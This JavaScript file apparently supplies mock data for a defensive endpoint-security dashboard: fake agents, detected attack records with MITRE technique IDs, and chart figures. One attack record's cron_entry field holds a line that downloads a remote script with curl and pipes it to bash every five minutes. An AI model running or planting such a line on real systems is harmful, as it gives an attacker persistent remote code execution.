// Mock data used for dashboard previews and development fallbacks

export const mockAgents = [
  { id: 'agt_1', agent_id: 'agt_a1b2c3', hostname: 'ubuntu-server-01', ip_address: '192.168.1.101', os: 'Ubuntu 22.04 LTS', version: '1.0.0', status: 'online', last_seen: new Date(Date.now() - 45000).toISOString(), threat_count: 3, risk_level: 'LOW' },
  { id: 'agt_2', agent_id: 'agt_d4e5f6', hostname: 'production-node', ip_address: '192.168.1.102', os: 'Ubuntu 20.04 LTS', version: '1.0.0', status: 'online', last_seen: new Date(Date.now() - 120000).toISOString(), threat_count: 1, risk_level: 'LOW' },
  { id: 'agt_3', agent_id: 'agt_g7h8i9', hostname: 'dev-machine', ip_address: '192.168.1.150', os: 'Ubuntu 22.04 LTS', version: '0.9.8', status: 'online', last_seen: new Date(Date.now() - 300000).toISOString(), threat_count: 0, risk_level: 'LOW' },
  { id: 'agt_4', agent_id: 'agt_j0k1l2', hostname: 'workstation-03', ip_address: '192.168.1.200', os: 'Ubuntu 20.04 LTS', version: '1.0.0', status: 'offline', last_seen: new Date(Date.now() - 7200000).toISOString(), threat_count: 8, risk_level: 'HIGH' },
  { id: 'agt_5', agent_id: 'agt_m3n4o5', hostname: 'server-02', ip_address: '10.0.0.15', os: 'Ubuntu 22.04 LTS', version: '1.0.0', status: 'online', last_seen: new Date(Date.now() - 60000).toISOString(), threat_count: 2, risk_level: 'SUSPICIOUS' },
];

export const mockAttacks = [
  {
    id: 'atk_1', agent_id: 'agt_a1b2c3', hostname: 'ubuntu-server-01',
    technique: 'T1059', title: 'Suspicious Process Tree',
    description: 'A process spawned an anomalous number of child processes within a short timeframe, consistent with T1059 command execution abuse.',
    severity: 'HIGH', status: 'MITIGATED', action_taken: 'TERMINATE_PROCESS_TREE',
    features: { parent_pid: 1234, child_count: 23, spawn_rate: '2.3/s', cpu_percent: 94.2, memory_mb: 342 },
    risk_score: 0.94, timestamp: new Date(Date.now() - 120000).toISOString(),
    detection_methods: ['Behavioral anomaly', 'ML process tree model', 'Resource anomaly'],
    process_name: 'bash', parent_process: 'sshd',
  },
  {
    id: 'atk_2', agent_id: 'agt_j0k1l2', hostname: 'workstation-03',
    technique: 'T1486', title: 'Mass File Modification',
    description: 'Mass file write activity detected in protected user directories. Behavior consistent with ransomware encryption pattern.',
    severity: 'CRITICAL', status: 'MITIGATED', action_taken: 'QUARANTINE_AND_TERMINATE',
    features: { files_modified: 821, write_rate: '41/s', directories_affected: 4, entropy_score: 7.9 },
    risk_score: 0.98, timestamp: new Date(Date.now() - 480000).toISOString(),
    detection_methods: ['Ransomware detection', 'Filesystem anomaly', 'ML filesystem model'],
    process_name: 'encrypt.py', parent_process: 'python3',
  },
  {
    id: 'atk_3', agent_id: 'agt_m3n4o5', hostname: 'server-02',
    technique: 'T1053', title: 'Cron Persistence',
    description: 'A suspicious cron job was detected that downloads and executes a remote script via curl on a regular schedule.',
    severity: 'SUSPICIOUS', status: 'MONITORING', action_taken: 'MONITOR_ONLY',
    features: { cron_entry: '*/5 * * * * curl http://10.10.10.1/s.sh | bash', entropy: 4.2, keyword_score: 3 },
    risk_score: 0.72, timestamp: new Date(Date.now() - 900000).toISOString(),
    detection_methods: ['Cron persistence detection', 'ML cron model', 'Entropy analysis'],
    process_name: 'cron', parent_process: 'systemd',
  },
  {
    id: 'atk_4', agent_id: 'agt_a1b2c3', hostname: 'ubuntu-server-01',
    technique: 'T1496', title: 'Resource Hijacking',
    description: 'Process detected consuming sustained high CPU resources (>90%) with characteristics matching cryptomining behavior.',
    severity: 'HIGH', status: 'MITIGATED', action_taken: 'TERMINATE_PROCESS_TREE',
    features: { process_name: 'xmrig', cpu_percent: 98.4, memory_mb: 145, uptime_s: 3600, network_connections: 2 },
    risk_score: 0.91, timestamp: new Date(Date.now() - 3600000).toISOString(),
    detection_methods: ['Resource anomaly', 'Behavioral analysis', 'ML process model'],
    process_name: 'xmrig', parent_process: 'bash',
  },
  {
    id: 'atk_5', agent_id: 'agt_d4e5f6', hostname: 'production-node',
    technique: 'T1059', title: 'Anomalous Child Processes',
    description: 'Web server process spawned unexpected shell processes, potentially indicating command injection.',
    severity: 'HIGH', status: 'MITIGATED', action_taken: 'TERMINATE_PROCESS_TREE',
    features: { parent_process: 'nginx', child_process: 'bash', child_count: 5, unexpected: true },
    risk_score: 0.85, timestamp: new Date(Date.now() - 7200000).toISOString(),
    detection_methods: ['Process tree analysis', 'Behavioral anomaly'],
    process_name: 'bash', parent_process: 'nginx',
  },
  {
    id: 'atk_6', agent_id: 'agt_g7h8i9', hostname: 'dev-machine',
    technique: 'T1055', title: 'Process Memory Anomaly',
    description: 'Process exhibited anomalous memory consumption pattern inconsistent with its historical baseline.',
    severity: 'SUSPICIOUS', status: 'MONITORING', action_taken: 'MONITOR_ONLY',
    features: { memory_mb: 2048, baseline_mb: 120, deviation_factor: 17.1 },
    risk_score: 0.65, timestamp: new Date(Date.now() - 10800000).toISOString(),
    detection_methods: ['ML process model', 'Memory anomaly'],
    process_name: 'node', parent_process: 'bash',
  },
];

export const mockChartData = [
  { date: 'Mon', critical: 0, high: 2, suspicious: 1, resolved: 1 },
  { date: 'Tue', critical: 1, high: 1, suspicious: 3, resolved: 2 },
  { date: 'Wed', critical: 0, high: 3, suspicious: 2, resolved: 3 },
  { date: 'Thu', critical: 2, high: 4, suspicious: 1, resolved: 5 },
  { date: 'Fri', critical: 1, high: 2, suspicious: 4, resolved: 4 },
  { date: 'Sat', critical: 0, high: 1, suspicious: 2, resolved: 2 },
  { date: 'Sun', critical: 1, high: 3, suspicious: 2, resolved: 3 },
];

export const mockDonutData = [
  { name: 'Critical', value: 5, color: '#dc2626' },
  { name: 'High', value: 16, color: '#f97316' },
  { name: 'Suspicious', value: 15, color: '#a78bfa' },
  { name: 'Resolved', value: 20, color: '#10b981' },
];
